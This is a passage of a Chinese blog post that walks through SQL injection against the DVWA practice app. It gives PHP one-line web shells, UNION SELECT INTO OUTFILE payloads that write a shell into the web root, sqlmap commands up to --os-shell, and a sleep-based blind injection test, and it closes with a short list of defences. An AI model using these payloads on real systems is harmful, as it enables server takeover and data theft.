+<p><font size=4>这里我们可以通过上传后门，通过控制后门来得到shell</font><br>例如：<br>&lt;?system($_REQUEST[‘cmd’]);?&gt;  //通过request提交，执行shell<br>&lt;?php eval($_POST[‘123’]);?&gt;   //PHP一句话木马，用工具连接即可</p>
+<p>这里我们可以构造如下语句<br><font color=red>-1’ union select 1,”&lt;?php @system($_REQUEST[‘cmd’]);?&gt;” into outfile “C:\\wamp\\www\\dvwa\\a.php”;#</font><br><font color=red>-1’ union select “&lt;?”,”php @system($_REQUEST[‘cmd’]);?&gt;” into outfile “C:\\wamp\\www\\dvwa\\a.php”;#</font><br>这两句是一样的，后一句只是对语句进行了拆分，里面的逗号会变为一个空格。<br>system()这个函数可以执行系统命令，即将传入的参数内容当作系统命令来执行</p>
+<p><img src="9.png" alt="9"><br>发现有一个警告，但是页面内容是没有回显的，接下来我们看看文件目录里是否有a.php这个文件</p>
+<p><img src="10.png" alt="10"><br>可以发现确实将文件写入了目录，接下来执行命令试试<br>通过访问localhost/dvwa/a.php?cmd=dir，获取当前的文件目录</p>
+<p><img src="11.png" alt="11"><br>那个1是文件里开头的那个1，也就是select 1时写入的</p>
+<p><font color=red>-1’ union select 1,”&lt;?php @eval($_POST[‘123’]);?&gt;” into outfile “C:\\wamp\\www\\dvwa\\b.php”;#</font><br>这里也执行类似的操作</p>
+<p><img src="12.png" alt="12"><br>这里使用菜刀连接即可</p>
+<p><img src="13.png" alt="13"></p>
+<h3 id="使用burp-suite破解表名"><a href="#使用burp-suite破解表名" class="headerlink" title="使用burp suite破解表名"></a>使用burp suite破解表名</h3><p>回顾之前手动猜解表名时使用的语句<strong>1’ and exists(select * from a)#</strong><br>打开bp设置好代理后，提交这条语句</p>
+<p><img src="15.png" alt="15"><br>可以bp已经抓取到我们的请求包了，这里参数是经过url编码的，接下来我们看一下对应的响应包</p>
+<p><img src="16.png" alt="16"><br>红线处可以作为回显的关键字用来判断是否存在这个表</p>
+<p>接下来，我们将请求报发送到intruder，先清除所有变量，再添加我们需要的变量</p>
+<p><img src="17.png" alt="17"><br><img src="18.png" alt="18"><br><img src="19.png" alt="19"><br>设置好后就可以开始攻击了</p>
+<p><img src="20.png" alt="20"><br>我们可以看到当表名为users时，没有出现<code>doesn&#39;t exist</code>这个关键字，说明是存在这个表的，从回应包也能看出</p>
+<h3 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h3><p>使用经典6步法</p>
+<ol>
+<li>-u “xxx” –cookie=”yyy” //带上cookie对URL进行注入</li>
+<li>-u “xxx” –cookie=”yyy” -current-db  //对数据库名进行获取</li>
+<li>-u “xxx” –cookie=”yyy” -D dvwa –tables //对数据库dvwa的表名进行枚举</li>
+<li>-u “xxx” –cookie=”yyy” -D dvwa -T users –columns //对dvwa库里的名为users表的列名进行枚举</li>
+<li>-u “xxx” –cookie=”yyy” -D dvwa -T users -C name,password –dump //探测user表的name和password字段，如果此时得到的密码为密文，sqlmap会自动询问，是否爆破</li>
+<li>-u “xxx” –cookie=”yyy” –os-shell //获取shell，选择后台语言</li>
+</ol>
+<p>一些补充：</p>
+<ul>
+<li>-v x  //x=0~6,不同级别显示不同程度的过程信息，数值越大，越详细</li>
+<li>–dbs //列出所有数据库</li>
+<li>–users //显示当前登录的用户</li>
+<li>–purge-output  //清除之前的缓存日志</li>
+<li>–password  //对跑出来的密码进行枚举</li>
+</ul>
+<p>先获取登录后的cookie值，因为dvwa需要登陆后操作</p>
+<p><img src="21.png" alt="21"><br><img src="22.png" alt="22"><br>已经扫描出有这些注入点<br>按上面步骤依此执行来获取信息<br>得到到当前数据库名是<code>dvwa</code>，得到到dvwa下的两张表<code>guestbook</code>和<code>users</code></p>
+<p><img src="23.png" alt="23"><br>得到字段名，接下来获取字段里的数据</p>
+<p><img src="24.png" alt="24"><br>接下来使用–os-shell来get shell</p>
+<p><img src="25.png" alt="25"><br><img src="26.png" alt="26"><br>文件写入成功</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>后台关闭了错误回显，对于渗透人员来说，因为无法看到反馈信息，而无法直接进行判断。<br>这种情况下，注入点仍然存在，只是手动利用起来非常麻烦</p>
+<p>使用sleep来进行基于时间的判断：<br><font color=red>1’ and sleep(3)#</font></p>
+<p>先输入一个’来测试<br><img src="27.png" alt="27"><br>发现没有返回报错信息，而是显示这个id不存在<br>当输入<code>1&#39; and sleep(3)#</code>发现页面3秒后才响应，说明是执行了sleep这个函数的<br>这里手工注入太耗时，还是直接上sqlmap就行了</p>
+<p>这里可以阅读一下后台的源码<br><img src="28.png" alt="28"></p>
+<h3 id="sql注入防范措施"><a href="#sql注入防范措施" class="headerlink" title="sql注入防范措施"></a>sql注入防范措施</h3><ul>
+<li>代码层面<ul>
+<li>对输入进行严格的转义和过滤</li>
+<li>使用参数化，不直接将用户输入拼接到sql语句中。</li>
+</ul>
+</li>
+<li>网络层面<ul>
+<li>通过waf设备（安全狗、D盾之类的）</li>
+<li>云端防护（如果找到服务器真实ip后可以绕过）</li>
+</ul>
+</li>
+</ul>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p><img src="29.png" alt="29"></p>
+<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p>这个级别下不在是输入框了，是给出了选项框，但是没关系，我们试着抓包该包<br><img src="30.png" alt="30"><br>说明是有漏洞的，但是这里将我们的“’”给转义了<br>这里尝试将“’”进行url编码，但是需要进行两次url编码才能绕过<br><img src="31.png" alt="31"><br>我们来看看源码</p>
+<pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;Submit&#39; ] ) ) {
+    // Get input
+    $id = $_POST[ &#39;id&#39; ];
+    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; );
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Display values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+}
+// This is used later on in the index.php page
+// Setting it here so we can close the database connection in here like in the rest of the source scripts
+$query  = &quot;SELECT COUNT(*) FROM users;&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+$number_of_rows = mysqli_fetch_row( $result )[0];
+mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+?&gt;</code></pre>
+<p><font color=red>$id = mysqli_real_escape_string($GLOBALS[“___mysqli_ston”], $id);</font><br><code>mysqli_real_escape_string</code>为关键函数，其功能就是转义特殊字符<br>当然直接联合查询就可以了</p>
+<p>盲注处使用的是一样的方法，这里就不再重复了</p>
+<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>这里只是利用独立窗口防止了自动化的注入，手工依然可以成功注入<br>盲注一样</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 zjre@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Dvwa-SQLInject</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">2.9k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="ZJR">ZJR</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-03-30, 18:01:58</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-30, 18:12:51</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/03/30/Dvwa-SQLInject/" title="Dvwa-SQLInject">http://zjr-g.github.io/2020/03/30/Dvwa-SQLInject/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 Zlog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#aes加密','#base64','#ctf-web','#BruteForce','#CSPBypass','#CSRF','#CommandInject','#FileInclude','#FileUpload','#InsecureCAPTCHA','#JavaScript','#SQLInject','#XSS','#WeakSessionIDs','#Git','#file_incloude','#MySql_show','#MySql_where','#MySql_like','#MySql_select','#MySql_order by','#MySql_regexp','#MySql_concat','#MySql_function','#MySql_group by','#MySql_having','#MySql_subquery','#MySql_jion','#MySql_union','#MySql_create','#MySql_alter','#MySql_insert','#MySql_update','#MySql_delete','#SSIT','#Markdown','#zip','#hexo',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
